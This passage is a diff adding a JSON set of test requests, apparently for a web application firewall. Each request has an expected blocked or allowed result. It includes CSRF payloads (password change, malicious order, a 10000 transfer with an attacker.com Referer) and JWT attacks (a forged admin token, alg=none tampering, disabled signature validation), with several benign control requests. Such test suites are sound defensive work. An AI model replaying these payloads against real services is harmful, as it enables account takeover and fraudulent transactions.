+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+      "Referer": "https://attacker.com"
+    },
+    "data": "{\"oldPwd\":\"123456\",\"newPwd\":\"654321\"}",
+    "expected_result": "blocked",
+    "attack_type": "csrf"
+  },
+  {
+    "poc_id": "csrf-002-post-form",
+    "name": "CSRF-提交恶意订单(POST-form)",
+    "url": "http://127.0.0.1/api/order/add",
+    "method": "POST",
+    "headers": {
+      "Host": "127.0.0.1",
+      "Content-Type": "application/x-www-form-urlencoded",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+      "Referer": "https://attacker.com"
+    },
+    "data": "userId=1001&goodsId=999&amount=9999",
+    "expected_result": "blocked",
+    "attack_type": "csrf"
+  },
+  {
+    "poc_id": "csrf-003-post-json",
+    "name": "CSRF-JSON格式恶意请求(JSON-POST)",
+    "url": "http://127.0.0.1/api/user/transfer",
+    "method": "POST",
+    "headers": {
+      "Host": "127.0.0.1",
+      "Content-Type": "application/json",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+      "Referer": "https://attacker.com"
+    },
+    "data": "{\"fromUserId\":\"1001\",\"toUserId\":\"9999\",\"amount\":10000,\"remark\":\"正常转账\"}",
+    "expected_result": "blocked",
+    "attack_type": "csrf"
+  },
+  {
+    "poc_id": "jwt-001-get",
+    "name": "JWT-签名绕过(GET)",
+    "url": "http://127.0.0.1/api/auth/verify",
+    "method": "GET",
+    "headers": {
+      "Host": "127.0.0.1",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+      "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjEwMDgsInJvbGUiOiJhZG1pbiJ9.e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
+    },
+    "data": "{}",
+    "expected_result": "blocked",
+    "attack_type": "jwt_vulnerability"
+  },
+  {
+    "poc_id": "jwt-002-post-form",
+    "name": "JWT-算法篡改(POST-form)",
+    "url": "http://127.0.0.1/api/auth/refresh",
+    "method": "POST",
+    "headers": {
+      "Host": "127.0.0.1",
+      "Content-Type": "application/x-www-form-urlencoded",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+    },
+    "data": "token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjEwMDgsInJvbGUiOiJhZG1pbiJ9.xxx&alg=none",
+    "expected_result": "blocked",
+    "attack_type": "jwt_vulnerability"
+  },
+  {
+    "poc_id": "jwt-003-post-json",
+    "name": "JWT-JSON格式算法篡改(JSON-POST)",
+    "url": "http://127.0.0.1/api/auth/verify/json",
+    "method": "POST",
+    "headers": {
+      "Host": "127.0.0.1",
+      "Content-Type": "application/json",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+    },
+    "data": "{\"token\":\"eyJhbGciOiJub25lIiwiZXhwIjoxNzM1Njg5NjAwLCJ1c2VySWQiOjEwMDh9.\",\"validateSignature\":false}",
+    "expected_result": "blocked",
+    "attack_type": "jwt_vulnerability"
+  },
+  {
+    "poc_id": "normal-001-get",
+    "name": "正常请求-查询用户列表(GET)",
+    "url": "http://127.0.0.1/api/user/list",
+    "method": "GET",
+    "headers": {
+      "Host": "127.0.0.1",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+    },
+    "data": "{\"page\":1,\"size\":10}",
+    "expected_result": "allowed",
+    "attack_type": "normal"
+  },
+  {
+    "poc_id": "normal-002-post-form",
+    "name": "正常请求-提交订单(POST-form)",
+    "url": "http://127.0.0.1/api/order/submit",
+    "method": "POST",
+    "headers": {
+      "Host": "127.0.0.1",
+      "Content-Type": "application/x-www-form-urlencoded",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+    },
+    "data": "userId=1001&goodsId=10&amount=99.9&addressId=5",
+    "expected_result": "allowed",
+    "attack_type": "normal"
+  },
+  {
+    "poc_id": "normal-003-post-form",
+    "name": "正常请求-普通POST参数(aaa=xxx)(POST-form)",
+    "url": "http://127.0.0.1/api/common/test",
+    "method": "POST",
+    "headers": {
+      "Host": "127.0.0.1",
+      "Content-Type": "application/x-www-form-urlencoded",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+    },
+    "data": "aaa=xxx&bbb=123&ccc=test",
+    "expected_result": "allowed",
+    "attack_type": "normal"
+  },
+  {
+    "poc_id": "normal-004-post-json",
+    "name": "正常请求-普通JSON格式Body(aaa=xxx)(JSON-POST)",
+    "url": "http://127.0.0.1/api/common/json",
+    "method": "POST",
+    "headers": {
+      "Host": "127.0.0.1",
+      "Content-Type": "application/json",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+    },
+    "data": "{\"aaa\":\"xxx\",\"bbb\":123,\"ccc\":\"test\",\"ddd\":[\"a\",\"b\",\"c\"]}",
+    "expected_result": "allowed",
+    "attack_type": "normal"
+  }
+]
